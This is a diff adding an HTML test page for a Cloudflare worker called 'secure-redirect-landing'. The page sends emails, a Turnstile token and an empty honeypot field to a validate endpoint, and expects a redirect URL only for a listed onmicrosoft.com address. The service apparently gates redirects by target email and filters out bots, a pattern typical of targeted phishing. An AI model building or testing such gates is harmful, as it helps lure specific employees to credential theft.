@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test App Functionality</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ccc; }
+        .success { background-color: #d4edda; border-color: #c3e6cb; }
+        .error { background-color: #f8d7da; border-color: #f5c6cb; }
+        button { padding: 10px 20px; margin: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>App Functionality Test</h1>
+    
+    <div class="test-section">
+        <h2>1. Test App Accessibility</h2>
+        <button onclick="testAppAccess()">Test App Access</button>
+        <div id="access-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>2. Test API Endpoint</h2>
+        <button onclick="testAPI()">Test API</button>
+        <div id="api-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>3. Test with Valid Email</h2>
+        <input type="email" id="testEmail" placeholder="Enter test email" value="lee@x1mev82.onmicrosoft.com">
+        <button onclick="testValidEmail()">Test Valid Email</button>
+        <div id="valid-email-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>4. Test with Invalid Email</h2>
+        <input type="email" id="invalidEmail" placeholder="Enter invalid email" value="invalid@test.com">
+        <button onclick="testInvalidEmail()">Test Invalid Email</button>
+        <div id="invalid-email-result"></div>
+    </div>
+
+    <script>
+        const APP_URL = 'https://secure-redirect-landing.agro-exim.workers.dev';
+        
+        async function testAppAccess() {
+            const resultDiv = document.getElementById('access-result');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(APP_URL);
+                if (response.ok) {
+                    resultDiv.innerHTML = '<span style="color: green;">✅ App is accessible!</span>';
+                    resultDiv.className = 'test-section success';
+                } else {
+                    resultDiv.innerHTML = `<span style="color: red;">❌ App returned status: ${response.status}</span>`;
+                    resultDiv.className = 'test-section error';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<span style="color: red;">❌ Error: ${error.message}</span>`;
+                resultDiv.className = 'test-section error';
+            }
+        }
+        
+        async function testAPI() {
+            const resultDiv = document.getElementById('api-result');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${APP_URL}/api/validate`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: 'test@example.com',
+                        turnstileToken: 'test-token',
+                        honeypotField: ''
+                    })
+                });
+                
+                const data = await response.json();
+                resultDiv.innerHTML = `<span style="color: blue;">📊 API Response: ${JSON.stringify(data, null, 2)}</span>`;
+                resultDiv.className = 'test-section';
+            } catch (error) {
+                resultDiv.innerHTML = `<span style="color: red;">❌ API Error: ${error.message}</span>`;
+                resultDiv.className = 'test-section error';
+            }
+        }
+        
+        async function testValidEmail() {
+            const email = document.getElementById('testEmail').value;
+            const resultDiv = document.getElementById('valid-email-result');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${APP_URL}/api/validate`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        turnstileToken: 'test-token',
+                        honeypotField: ''
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    resultDiv.innerHTML = `<span style="color: green;">✅ Valid email accepted! Redirect URL: ${data.redirectUrl}</span>`;
+                    resultDiv.className = 'test-section success';
+                } else {
+                    resultDiv.innerHTML = `<span style="color: orange;">⚠️ Response: ${data.message}</span>`;
+                    resultDiv.className = 'test-section';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<span style="color: red;">❌ Error: ${error.message}</span>`;
+                resultDiv.className = 'test-section error';
+            }
+        }
+        
+        async function testInvalidEmail() {
+            const email = document.getElementById('invalidEmail').value;
+            const resultDiv = document.getElementById('invalid-email-result');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${APP_URL}/api/validate`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        turnstileToken: 'test-token',
+                        honeypotField: ''
+                    })
+                });
+                
+                const data = await response.json();
+                if (!data.success) {
+                    resultDiv.innerHTML = `<span style="color: green;">✅ Invalid email correctly rejected: ${data.message}</span>`;
+                    resultDiv.className = 'test-section success';
+                } else {
+                    resultDiv.innerHTML = `<span style="color: red;">❌ Invalid email was accepted!</span>`;
+                    resultDiv.className = 'test-section error';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<span style="color: red;">❌ Error: ${error.message}</span>`;
+                resultDiv.className = 'test-section error';
+            }
+        }
+    </script>
+</body>
+</html> 
